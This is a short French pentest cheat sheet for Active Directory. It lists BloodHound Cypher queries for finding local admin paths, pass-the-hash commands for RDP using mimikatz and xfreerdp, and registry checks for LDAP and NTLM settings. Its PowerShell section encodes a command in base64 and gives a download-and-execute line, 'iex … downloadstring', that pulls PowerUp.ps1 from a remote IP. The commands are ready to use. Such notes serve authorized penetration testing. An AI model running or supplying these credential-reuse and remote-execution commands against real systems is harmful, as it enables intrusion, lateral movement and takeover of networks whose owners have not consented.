---
title: Cheat Sheet Active Directory
permalink: /CheatSheet_AD/
---

# Cheat Sheet Active Directory

Liste de commandes utiles en pentest Active Directory. Commandes Windows & Linux.

## Cypher Queries

Requêtes Cypher qui peuvent être utiles:

``` 
# Liste de tous les utilisateurs avec des droits d'admins locaux (direct ou via un groupe)
MATCH p=(u:User)-[r:AdminTo|MemberOf*1..]->(c:Computer) RETURN p

# Juste les groupes
MATCH p=(g:Group)-[r:AdminTo|MemberOf*1..]->(c:Computer) RETURN p

# Admin direct (sans groupe)
MATCH p=(u:User)-[r:AdminTo]->(c:Computer) RETURN p
```

## Remote Desktop Protocol

Pour faire un pass the hash avec RDP sous Windows (via mimikatz)

``` 
sekurlsa::pth /user:user /domain:domain.local /ntlm:xxxxxxxxxxxxxxx /run:"mstsc.exe /restrictedadmin"
```

Sous Linux
``` bash
xfreerdp /u:USER /d:DOMAIN /pth:NTLM /v:server.domain.local
```

## Configuration Active Directory

Récupérer des informations de configuration (accès local nécessaire):

``` powershell
# LDAP Signing
Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -Name LDAPServerIntegrity
# LDAP Channel Binding
Get-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters -Name LdapEnforceChannelBinding
# Protocoles autorisés pour échanges NTLM
Get-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name LmCompatibilityLevel
```

## Powershell

``` powershell
# Convertit une chaine en base64
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("net user"))

# Exécute une commande à partir d'une chaîne base64
powershell -e bgBlAHQAIAB1AHMAZQByAA==

# Télécharger et exécuter un fichier
iex (new-object net.webclient).downloadstring('http://10.133.151.246:8080/PowerUp.ps1')
iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
```
